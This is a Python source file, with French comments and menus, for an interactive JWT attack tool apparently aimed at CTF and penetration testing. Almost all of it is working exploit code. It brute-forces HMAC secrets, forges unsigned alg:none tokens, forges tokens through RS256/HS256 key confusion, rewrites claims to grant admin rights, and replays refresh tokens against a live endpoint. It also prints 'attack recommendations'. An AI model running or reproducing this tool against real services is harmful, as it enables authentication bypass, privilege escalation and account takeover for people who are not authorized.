#!/usr/bin/env python3
"""
JWT Exploitation Tool by H8Laws — corrected & improved
Outil interactif pour analyser, manipuler et tester des JWT (CTF / pentest)
Améliorations apportées :
 - Correction de la génération du token (pas de point final superflu pour alg=none)
 - Support HS256 / HS384 / HS512 pour la création de signatures
 - parse_jwt accepte maintenant header.payload (2 parties) et normalise
 - modify_claims : conversions sécurisées de types, vérification avant .lower()
 - Robustesse réseau (requests optionnel), erreurs mieux gérées
 - Petites améliorations d'affichage et recommandations
"""

import base64
import hashlib
import hmac
import json
import sys
import time
import re
from datetime import datetime, timedelta
from typing import Optional, Dict, Tuple, List

# Tentative d'importer requests mais ne pas planter si absent
try:
    import requests  # type: ignore
except Exception:
    requests = None  # type: ignore

# === Couleurs ===
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
MAGENTA = "\033[1;35m"
RESET = "\033[0m"

# === Banner ===
def banner() -> None:
    print(RED + r"""
     ██╗██╗    ██╗████████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗
     ██║██║    ██║╚══██╔══╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
     ██║██║ █╗ ██║   ██║       ███████║███████║██║     █████╔╝ 
██   ██║██║███╗██║   ██║       ██╔══██║██╔══██║██║     ██╔═██╗ 
╚█████╔╝╚███╔███╔╝   ██║       ██║  ██║██║  ██║╚██████╗██║  ██╗
 ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
""" + RESET)
    print(f"{CYAN}          JWT Exploitation Tool - CTF Edition by H8Laws (improved){RESET}")
    print(f"{YELLOW}          Brute Force | Alg None | RS256/HS256 | Token Abuse{RESET}\n")

# === Fonctions utilitaires JWT ===
def base64url_decode(data: str) -> bytes:
    """Décode du base64url en bytes (gère le padding manquant)."""
    if isinstance(data, str):
        # Remplacer les caractères URL-safe
        data = data.replace('-', '+').replace('_', '/')
        # Ajouter le padding manquant (0..3 '=')
        padding = (-len(data)) % 4
        if padding:
            data += '=' * padding
        return base64.b64decode(data)
    raise TypeError("base64url_decode attend une chaîne")

def base64url_encode(data: bytes) -> str:
    """Encode en base64url (retire le padding)."""
    if not isinstance(data, (bytes, bytearray)):
        raise TypeError("base64url_encode attend bytes")
    encoded = base64.b64encode(data).decode('utf-8')
    return encoded.rstrip('=').replace('+', '-').replace('/', '_')

def safe_json_loads(b: bytes) -> Optional[Dict]:
    """Charge des bytes JSON en dict en gérant les erreurs"""
    try:
        if isinstance(b, (bytes, bytearray)):
            s = b.decode('utf-8', errors='ignore')
        else:
            s = str(b)
        return json.loads(s)
    except Exception:
        return None

def parse_jwt(token: str) -> Optional[Dict]:
    """
    Parse un JWT et retourne header, payload, signature, raw_parts.
    Accepte les tokens à 2 parties (header.payload) en les normalisant.
    """
    try:
        parts = token.split('.')
        if len(parts) not in (2, 3):
            print(f"{RED}[-] JWT invalide : doit avoir 2 ou 3 parties séparées par des points{RESET}")
            return None

        # Normaliser à 3 parties en garantissant que la signature peut être vide
        if len(parts) == 2:
            parts.append('')

        header = safe_json_loads(base64url_decode(parts[0]))
        payload = safe_json_loads(base64url_decode(parts[1]))
        signature = parts[2]

        if header is None or payload is None:
            print(f"{RED}[-] Erreur : header ou payload non décodable en JSON{RESET}")
            return None

        return {
            'header': header,
            'payload': payload,
            'signature': signature,
            'raw_parts': parts
        }
    except Exception as e:
        print(f"{RED}[-] Erreur lors du parsing du JWT : {e}{RESET}")
        return None

def display_jwt_info(parsed: Dict) -> None:
    """Affiche les informations du JWT de manière formatée"""
    print(f"\n{BLUE}{'='*70}{RESET}")
    print(f"{CYAN}📋 JWT Information{RESET}")
    print(f"{BLUE}{'='*70}{RESET}\n")

    print(f"{GREEN}[Header]{RESET}")
    print(json.dumps(parsed['header'], indent=2, ensure_ascii=False))

    print(f"\n{GREEN}[Payload]{RESET}")
    print(json.dumps(parsed['payload'], indent=2, ensure_ascii=False))

    print(f"\n{GREEN}[Signature]{RESET}")
    sig = parsed.get('signature', '')
    if sig:
        print(f"{sig[:80]}..." if len(sig) > 80 else sig)
    else:
        print(f"{YELLOW}<empty>{RESET}")

    # Informations utiles
    if 'exp' in parsed['payload']:
        try:
            exp_timestamp = int(parsed['payload']['exp'])
            exp_date = datetime.fromtimestamp(exp_timestamp)
            now = datetime.now()
            print(f"\n{YELLOW}⏰ Expiration : {exp_date.strftime('%Y-%m-%d %H:%M:%S')}{RESET}")
            if exp_date < now:
                print(f"{RED}   ⚠️  Token expiré !{RESET}")
            else:
                remaining = exp_date - now
                days = remaining.days
                hours = remaining.seconds // 3600
                minutes = (remaining.seconds % 3600) // 60
                print(f"{GREEN}   ✓ Valide encore {days}d {hours}h {minutes}m{RESET}")
        except Exception:
            print(f"{YELLOW}⏰ Expiration : valeur invalide{RESET}")

    print(f"{BLUE}{'='*70}{RESET}\n")

def create_jwt(header: Dict, payload: Dict, secret: str = "", force_hs_alg: Optional[str] = None) -> str:
    """
    Crée un JWT à partir du header et payload.
    - Si alg == 'none' -> retourne 'header.payload' (sans point final).
    - Supporte HS256, HS384, HS512 quand secret fourni.
    - force_hs_alg : optionnel, permet de forcer la valeur du champ 'alg' dans l'en-tête
      (ex: 'HS256') - utile quand on convertit RS256 -> HS256.
    """
    # Préparer header/payload encodés
    header_to_use = dict(header)  # copy
    if force_hs_alg:
        header_to_use['alg'] = force_hs_alg
    alg = header_to_use.get('alg', '').upper()

    header_encoded = base64url_encode(json.dumps(header_to_use, separators=(',', ':'), ensure_ascii=False).encode('utf-8'))
    payload_encoded = base64url_encode(json.dumps(payload, separators=(',', ':'), ensure_ascii=False).encode('utf-8'))

    message = f"{header_encoded}.{payload_encoded}"

    signature = ""
    if alg == 'NONE':
        signature = ""
    elif secret:
        # Choisir l'algorithme HMAC
        if alg == 'HS256':
            digest = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            signature = base64url_encode(digest)
        elif alg == 'HS384':
            digest = hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
            signature = base64url_encode(digest)
        elif alg == 'HS512':
            digest = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
            signature = base64url_encode(digest)
        else:
            # Algorithme non supporté pour la signature automatique
            print(f"{YELLOW}[!] Algorithme {alg} non supporté pour la signature automatique{RESET}")
            signature = ""
    else:
        # Pas de secret fourni -> signature vide
        signature = ""

    # Retourner sans trailing dot si signature vide
    if signature:
        return f"{message}.{signature}"
    else:
        return message

# === 1. Brute Force de secret faible ===
def brute_force_secret(token: str, wordlist_path: Optional[str] = None, max_attempts: Optional[int] = None) -> Optional[str]:
    """Brute force du secret JWT avec une wordlist"""
    print(f"\n{CYAN}[*] Lancement du brute force de secret JWT...{RESET}\n")

    parsed = parse_jwt(token)
    if not parsed:
        return None

    alg = parsed['header'].get('alg', 'HS256').upper()
    if alg not in ['HS256', 'HS512', 'HS384']:
        print(f"{RED}[-] L'algorithme {alg} n'est pas supporté pour le brute force (seuls HS256/HS384/HS512){RESET}")
        return None

    # Wordlist par défaut
    if not wordlist_path:
        print(f"{YELLOW}[*] Utilisation de la wordlist par défaut{RESET}")
        common_secrets = [
            'secret', 'password', 'admin', '123456', 'qwerty',
            'your-256-bit-secret', 'your-secret-key', 'mysecretkey',
            'jwt-secret', 'secretkey', 'key', 'changeme', 'password123',
            'admin123', 'root', 'toor', 'test', 'demo', 'secret123',
            '', ' ', 'null', 'undefined', 'bearer', 'token'
        ]
        wordlist = common_secrets
    else:
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                wordlist = [line.strip() for line in f if line.strip()]
            print(f"{GREEN}[+] Wordlist chargée : {len(wordlist)} entrées{RESET}")
        except Exception as e:
            print(f"{RED}[-] Erreur lors de la lecture de la wordlist : {e}{RESET}")
            return None

    # Message à signer
    message = f"{parsed['raw_parts'][0]}.{parsed['raw_parts'][1]}"
    target_signature = parsed.get('signature', '')

    # Choisir la fonction de hash
    hash_func = {
        'HS256': hashlib.sha256,
        'HS384': hashlib.sha384,
        'HS512': hashlib.sha512
    }.get(alg, hashlib.sha256)

    total = len(wordlist)
    if total == 0:
        print(f"{RED}[-] Wordlist vide{RESET}")
        return None

    print(f"{CYAN}[*] Tentative de {total} secrets...{RESET}\n")

    start_time = time.time()
    attempts = 0

    for secret in wordlist:
        attempts += 1
        if max_attempts and attempts > max_attempts:
            break

        try:
            sig = base64url_encode(hmac.new(secret.encode(), message.encode(), hash_func).digest())
        except Exception:
            # problème d'encodage du secret
            continue

        if sig == target_signature:
            elapsed = time.time() - start_time
            print(f"\n{GREEN}{'='*70}{RESET}")
            print(f"{GREEN}[✓] SECRET TROUVÉ !{RESET}")
            print(f"{GREEN}{'='*70}{RESET}")
            print(f"{YELLOW}Secret : {CYAN}{secret}{RESET}")
            print(f"{YELLOW}Temps : {CYAN}{elapsed:.2f}s{RESET}")
            print(f"{YELLOW}Tentatives : {CYAN}{attempts}{RESET}")
            print(f"{GREEN}{'='*70}{RESET}\n")
            return secret

        if attempts % 100 == 0 or attempts == total:
            print(f"{YELLOW}[*] Testé {attempts}/{total} secrets...{RESET}", end='\r')

    elapsed = time.time() - start_time
    print(f"\n{RED}[-] Secret non trouvé après {attempts} tentatives ({elapsed:.2f}s){RESET}\n")
    return None

# === 2. Test alg:none ===
def test_alg_none(token: str) -> List[Tuple[str, str]]:
    """Teste la vulnérabilité alg:none"""
    print(f"\n{CYAN}[*] Test de la vulnérabilité alg:none...{RESET}\n")

    parsed = parse_jwt(token)
    if not parsed:
        return []

    variants: List[Tuple[str, str]] = []

    # Variante 1: alg = "none" (minuscule)
    header1 = parsed['header'].copy()
    header1['alg'] = 'none'
    token1 = create_jwt(header1, parsed['payload'])
    variants.append(('none (minuscule)', token1))

    # Variante 2: alg = "None" (capitalisé)
    header2 = parsed['header'].copy()
    header2['alg'] = 'None'
    token2 = create_jwt(header2, parsed['payload'])
    variants.append(('None (capitalisé)', token2))

    # Variante 3: alg = "NONE" (majuscule)
    header3 = parsed['header'].copy()
    header3['alg'] = 'NONE'
    token3 = create_jwt(header3, parsed['payload'])
    variants.append(('NONE (majuscule)', token3))

    # Variante 4: Sans signature mais avec point final (certains serveurs attendent un '.' final)
    header4 = parsed['header'].copy()
    header4['alg'] = 'none'
    token4 = create_jwt(header4, parsed['payload']) + '.'
    variants.append(('none avec point final', token4))

    print(f"{GREEN}[+] {len(variants)} variantes générées :{RESET}\n")

    for i, (desc, variant_token) in enumerate(variants, 1):
        print(f"{YELLOW}Variante {i} ({desc}):{RESET}")
        print(f"{CYAN}{variant_token}{RESET}\n")

    return variants

# === 3. Confusion RS256/HS256 ===
def test_rs256_to_hs256(token: str, public_key_path: Optional[str] = None) -> Optional[str]:
    """Teste la confusion d'algorithme RS256 -> HS256"""
    print(f"\n{CYAN}[*] Test de confusion RS256 -> HS256...{RESET}\n")

    parsed = parse_jwt(token)
    if not parsed:
        return None

    alg = parsed['header'].get('alg', '').upper()
    if alg != 'RS256':
        print(f"{YELLOW}[!] Le token utilise l'algorithme {alg}, pas RS256{RESET}")
        print(f"{YELLOW}[!] Cette attaque fonctionne quand le serveur attend RS256{RESET}")

    if not public_key_path:
        # Génération d'un token HS256 avec secrets communs pour tests rapides
        header_hs256 = parsed['header'].copy()
        header_hs256['alg'] = 'HS256'

        common_keys = ['public_key', 'public', 'key', '-----BEGIN PUBLIC KEY-----']
        print(f"{GREEN}Tokens HS256 avec secrets communs :{RESET}\n")
        for secret in common_keys:
            token_hs256 = create_jwt(header_hs256, parsed['payload'], secret)
            print(f"{YELLOW}Secret: {secret}{RESET}")
            print(f"{CYAN}{token_hs256}{RESET}\n")
        return None

    try:
        with open(public_key_path, 'r', encoding='utf-8') as f:
            public_key = f.read().strip()

        print(f"{GREEN}[+] Clé publique chargée{RESET}\n")

        # Forcer HS256 et utiliser la clé publique comme secret
        header_hs256 = parsed['header'].copy()
        header_hs256['alg'] = 'HS256'

        token_hs256 = create_jwt(header_hs256, parsed['payload'], public_key)

        print(f"{GREEN}[✓] Token HS256 généré avec la clé publique comme secret :{RESET}\n")
        print(f"{CYAN}{token_hs256}{RESET}\n")

        return token_hs256

    except Exception as e:
        print(f"{RED}[-] Erreur : {e}{RESET}")
        return None

# === 4. Modification de claims ===
def modify_claims(token: str) -> Optional[str]:
    """Interface pour modifier les claims du JWT"""
    print(f"\n{CYAN}[*] Modification des claims JWT...{RESET}\n")

    parsed = parse_jwt(token)
    if not parsed:
        return None

    display_jwt_info(parsed)

    print(f"{YELLOW}[?] Que voulez-vous modifier ?{RESET}\n")
    print(f"  1. Modifier un claim existant")
    print(f"  2. Ajouter un nouveau claim")
    print(f"  3. Supprimer un claim")
    print(f"  4. Modifications rapides (admin, role, etc.)")
    print(f"  5. Changer l'expiration")
    print(f"  0. Retour")

    choice = input(f"\n{CYAN}[?] Choix : {RESET}").strip()

    new_payload = dict(parsed['payload'])  # copy

    if choice == '1':
        key = input(f"{CYAN}[?] Nom du claim à modifier : {RESET}").strip()
        if key in new_payload:
            print(f"{YELLOW}Valeur actuelle : {new_payload[key]}{RESET}")
            value_raw = input(f"{CYAN}[?] Nouvelle valeur : {RESET}").strip()

            # Tenter de convertir en int/float
            value_converted = value_raw
            try:
                if value_raw.lower() in ('true', 'false'):
                    value_converted = value_raw.lower() == 'true'
                else:
                    if '.' in value_raw:
                        value_converted = float(value_raw)
                    else:
                        value_converted = int(value_raw)
            except Exception:
                # conserver la chaine si conversion échoue
                value_converted = value_raw

            new_payload[key] = value_converted
        else:
            print(f"{RED}[-] Claim '{key}' non trouvé{RESET}")
            return None

    elif choice == '2':
        key = input(f"{CYAN}[?] Nom du nouveau claim : {RESET}").strip()
        value_raw = input(f"{CYAN}[?] Valeur : {RESET}").strip()

        value_converted = value_raw
        try:
            if value_raw.lower() in ('true', 'false'):
                value_converted = value_raw.lower() == 'true'
            else:
                if '.' in value_raw:
                    value_converted = float(value_raw)
                else:
                    value_converted = int(value_raw)
        except Exception:
            value_converted = value_raw

        new_payload[key] = value_converted

    elif choice == '3':
        key = input(f"{CYAN}[?] Nom du claim à supprimer : {RESET}").strip()
        if key in new_payload:
            del new_payload[key]
        else:
            print(f"{RED}[-] Claim '{key}' non trouvé{RESET}")
            return None

    elif choice == '4':
        print(f"\n{YELLOW}Modifications rapides :{RESET}\n")
        print(f"  1. is_admin = true")
        print(f"  2. role = admin")
        print(f"  3. user = admin")
        print(f"  4. username = admin")
        print(f"  5. email = admin@localhost")
        print(f"  6. uid = 0")

        quick = input(f"\n{CYAN}[?] Choix : {RESET}").strip()

        quick_mods = {
            '1': {'is_admin': True},
            '2': {'role': 'admin'},
            '3': {'user': 'admin'},
            '4': {'username': 'admin'},
            '5': {'email': 'admin@localhost'},
            '6': {'uid': 0}
        }

        if quick in quick_mods:
            new_payload.update(quick_mods[quick])
        else:
            print(f"{RED}[-] Choix invalide{RESET}")
            return None

    elif choice == '5':
        hours_input = input(f"{CYAN}[?] Expiration dans combien d'heures ? (défaut: 24) : {RESET}").strip()
        try:
            hours = int(hours_input) if hours_input else 24
        except Exception:
            hours = 24

        exp_time = datetime.now() + timedelta(hours=hours)
        new_payload['exp'] = int(exp_time.timestamp())
        print(f"{GREEN}[+] Expiration réglée sur : {exp_time.strftime('%Y-%m-%d %H:%M:%S')}{RESET}")

    else:
        return None

    # Générer le nouveau token
    print(f"\n{YELLOW}[*] Nouveau payload :{RESET}")
    print(json.dumps(new_payload, indent=2, ensure_ascii=False))

    print(f"\n{YELLOW}[?] Voulez-vous signer le token ?{RESET}")
    print(f"  1. Pas de signature (alg:none)")
    print(f"  2. Avec un secret (HS256)")
    print(f"  3. Garder la signature originale (ne fonctionnera probablement pas)")

    sign_choice = input(f"\n{CYAN}[?] Choix : {RESET}").strip()

    if sign_choice == '1':
        header = dict(parsed['header'])
        header['alg'] = 'none'
        new_token = create_jwt(header, new_payload)
    elif sign_choice == '2':
        secret = input(f"{CYAN}[?] Secret HMAC : {RESET}").strip()
        # Forcer HS256 si on signe avec un secret
        header = dict(parsed['header'])
        header['alg'] = 'HS256'
        new_token = create_jwt(header, new_payload, secret)
    else:
        # Garder l'ancienne signature (ne fonctionnera pas probablement)
        header_encoded = base64url_encode(json.dumps(parsed['header'], separators=(',', ':'), ensure_ascii=False).encode('utf-8'))
        payload_encoded = base64url_encode(json.dumps(new_payload, separators=(',', ':'), ensure_ascii=False).encode('utf-8'))
        signature = parsed.get('signature', '')
        if signature:
            new_token = f"{header_encoded}.{payload_encoded}.{signature}"
        else:
            new_token = f"{header_encoded}.{payload_encoded}"

    print(f"\n{GREEN}[✓] Nouveau token généré :{RESET}\n")
    print(f"{CYAN}{new_token}{RESET}\n")

    return new_token

# === 5. Refresh Token Abuse ===
def refresh_token_abuse(refresh_token: str, endpoint: Optional[str] = None) -> None:
    """Teste l'abus de refresh tokens"""
    print(f"\n{CYAN}[*] Test d'abus de refresh token...{RESET}\n")

    # Parser le refresh token s'il ressemble à un JWT
    if refresh_token and refresh_token.count('.') in (1, 2):
        parsed = parse_jwt(refresh_token)
        if parsed:
            display_jwt_info(parsed)

    if not endpoint:
        print(f"{YELLOW}[!] Endpoint non fourni{RESET}\n")
        print(f"{CYAN}[*] Attaques courantes sur les refresh tokens :{RESET}\n")
        print(f"  1. {YELLOW}Réutilisation multiple{RESET} - Tenter d'utiliser le même refresh token plusieurs fois")
        print(f"  2. {YELLOW}Token volé{RESET} - Utiliser un refresh token d'un autre utilisateur")
        print(f"  3. {YELLOW}Pas d'expiration{RESET} - Vérifier si le token n'expire jamais")
        print(f"  4. {YELLOW}Pas de révocation{RESET} - Vérifier si le token fonctionne après logout")
        print(f"  5. {YELLOW}Modification du user_id{RESET} - Modifier l'ID utilisateur dans le refresh token")

        print(f"\n{CYAN}[*] Checklist manuelle :{RESET}\n")
        checklist = [
            "☐ Le refresh token peut-il être réutilisé plusieurs fois ?",
            "☐ Le refresh token expire-t-il ?",
            "☐ Le refresh token est-il révoqué après déconnexion ?",
            "☐ Peut-on deviner/bruteforcer les refresh tokens ?",
            "☐ Les refresh tokens sont-ils liés à une session/IP ?",
            "☐ Peut-on échanger un refresh token contre plusieurs access tokens ?",
        ]

        for item in checklist:
            print(f"  {item}")

        return

    if requests is None:
        print(f"{RED}[-] La bibliothèque 'requests' n'est pas installée. Installez-la avec: pip install requests{RESET}")
        return

    # Test automatique si endpoint fourni
    print(f"{CYAN}[*] Test de réutilisation du refresh token...{RESET}\n")

    for i in range(5):
        try:
            print(f"{YELLOW}[*] Tentative {i+1}/5...{RESET}")
            response = requests.post(
                endpoint,
                json={'refresh_token': refresh_token},
                timeout=5
            )

            print(f"{GREEN}[+] Status: {response.status_code}{RESET}")

            if response.status_code == 200:
                print(f"{GREEN}[✓] Refresh token accepté !{RESET}")
                try:
                    data = response.json()
                    if isinstance(data, dict) and 'access_token' in data:
                        at = data['access_token']
                        print(f"{CYAN}Access token obtenu : {at[:80]}...{RESET}" if isinstance(at, str) else f"{CYAN}Access token obtenu{RESET}")
                except Exception:
                    pass
            else:
                print(f"{RED}[-] Refresh token refusé (status {response.status_code}){RESET}")
                break

            time.sleep(1)

        except Exception as e:
            print(f"{RED}[-] Erreur : {e}{RESET}")
            break

    print()

# === 6. Analyse complète ===
def full_analysis(token: str) -> None:
    """Effectue une analyse complète du JWT"""
    print(f"\n{CYAN}[*] Analyse complète du JWT...{RESET}\n")

    parsed = parse_jwt(token)
    if not parsed:
        return

    display_jwt_info(parsed)

    # Vérifications de sécurité
    print(f"{YELLOW}🔍 Analyse de sécurité :{RESET}\n")

    issues: List[str] = []

    # Vérifier l'algorithme
    alg = parsed['header'].get('alg', '').upper()
    if alg == 'NONE':
        issues.append(f"{RED}[!] CRITIQUE : Algorithme 'none' utilisé (pas de signature){RESET}")
    elif alg in ['HS256', 'HS512', 'HS384']:
        issues.append(f"{YELLOW}[!] Algorithme symétrique ({alg}) - Vulnérable au brute force{RESET}")
    elif alg in ['RS256', 'RS512']:
        issues.append(f"{GREEN}[✓] Algorithme asymétrique ({alg}) - Plus sécurisé{RESET}")
        issues.append(f"{YELLOW}[!] Vérifier la confusion RS256/HS256{RESET}")
    else:
        issues.append(f"{YELLOW}[!] Algorithme inconnu ou non standard : {alg}{RESET}")

    # Vérifier l'expiration
    if 'exp' not in parsed['payload']:
        issues.append(f"{RED}[!] CRITIQUE : Pas d'expiration (exp) définie{RESET}")
    else:
        try:
            exp_date = datetime.fromtimestamp(int(parsed['payload']['exp']))
            now = datetime.now()
            if exp_date < now:
                issues.append(f"{RED}[!] Token expiré{RESET}")
            else:
                delta = exp_date - now
                if delta.days > 365:
                    issues.append(f"{YELLOW}[!] Expiration très longue ({delta.days} jours){RESET}")
        except Exception:
            issues.append(f"{YELLOW}[!] Valeur d'expiration (exp) invalide{RESET}")

    # Vérifier les claims sensibles
    sensitive_claims = ['is_admin', 'admin', 'role', 'permissions', 'scope']
    for claim in sensitive_claims:
        if claim in parsed['payload']:
            value = parsed['payload'][claim]
            issues.append(f"{YELLOW}[!] Claim sensible trouvé : {claim} = {value}{RESET}")

    # Vérifier la taille
    if len(token) < 100:
        issues.append(f"{YELLOW}[!] Token très court - Secret potentiellement faible{RESET}")

    # Afficher les résultats
    for issue in issues:
        print(f"  {issue}")

    # Recommandations d'attaque
    print(f"\n{CYAN}💡 Recommandations d'attaque :{RESET}\n")

    if alg in ['HS256', 'HS512', 'HS384']:
        print(f"  {GREEN}→{RESET} Lancer un brute force du secret")

    if alg != 'NONE':
        print(f"  {GREEN}→{RESET} Tester la vulnérabilité alg:none")

    if alg in ['RS256', 'RS512']:
        print(f"  {GREEN}→{RESET} Tester la confusion RS256/HS256")

    if 'is_admin' in parsed['payload'] or 'role' in parsed['payload']:
        print(f"  {GREEN}→{RESET} Modifier les claims pour obtenir des privilèges")

    print()

# === Menu principal ===
def main() -> None:
    banner()

    # Permettre de fournir un token en argument
    token = ""
    if len(sys.argv) > 1:
        token = sys.argv[1].strip()
    else:
        print(f"{CYAN}[?] JWT Token à analyser :{RESET}")
        token = input(f"{GREEN}> {RESET}").strip()

    if not token:
        print(f"{RED}[-] Token requis !{RESET}")
        return

    while True:
        print(f"\n{BLUE}{'='*70}{RESET}")
        print(f"{CYAN}🎯 JWT EXPLOITATION MENU{RESET}")
        print(f"{BLUE}{'='*70}{RESET}\n")
        print(f"  {YELLOW}1.{RESET} 🔍 Analyser le JWT")
        print(f"  {YELLOW}2.{RESET} 💥 Brute Force du secret")
        print(f"  {YELLOW}3.{RESET} 🚫 Test alg:none")
        print(f"  {YELLOW}4.{RESET} 🔄 Confusion RS256/HS256")
        print(f"  {YELLOW}5.{RESET} ✏️  Modifier les claims")
        print(f"  {YELLOW}6.{RESET} 🔁 Refresh Token Abuse")
        print(f"  {YELLOW}7.{RESET} 🔬 Analyse complète")
        print(f"  {YELLOW}8.{RESET} 🔄 Changer de token")
        print(f"  {YELLOW}0.{RESET} ❌ Quitter")

        choice = input(f"\n{CYAN}[?] Choix : {RESET}").strip()

        if choice == '1':
            parsed = parse_jwt(token)
            if parsed:
                display_jwt_info(parsed)

        elif choice == '2':
            wordlist = input(f"{CYAN}[?] Chemin de la wordlist (Entrée pour wordlist par défaut) : {RESET}").strip()
            brute_force_secret(token, wordlist if wordlist else None)

        elif choice == '3':
            test_alg_none(token)

        elif choice == '4':
            pubkey = input(f"{CYAN}[?] Chemin de la clé publique (Entrée pour générique) : {RESET}").strip()
            test_rs256_to_hs256(token, pubkey if pubkey else None)

        elif choice == '5':
            new_token = modify_claims(token)
            if new_token:
                use_new = input(f"{CYAN}[?] Utiliser ce nouveau token pour la suite ? (y/N) : {RESET}").strip().lower()
                if use_new == 'y':
                    token = new_token

        elif choice == '6':
            refresh_token = input(f"{CYAN}[?] Refresh token (Entrée pour utiliser le token actuel) : {RESET}").strip()
            endpoint = input(f"{CYAN}[?] Endpoint de refresh (optionnel) : {RESET}").strip()
            refresh_token_abuse(refresh_token if refresh_token else token, endpoint if endpoint else None)

        elif choice == '7':
            full_analysis(token)

        elif choice == '8':
            print(f"{CYAN}[?] Nouveau JWT Token :{RESET}")
            new_token = input(f"{GREEN}> {RESET}").strip()
            if new_token:
                token = new_token
                print(f"{GREEN}[+] Token mis à jour !{RESET}")

        elif choice == '0':
            print(f"\n{GREEN}[+] Au revoir !{RESET}\n")
            break

        else:
            print(f"{RED}[-] Choix invalide !{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[!] Interruption détectée{RESET}")
        print(f"{GREEN}[+] Au revoir !{RESET}\n")
        sys.exit(0)
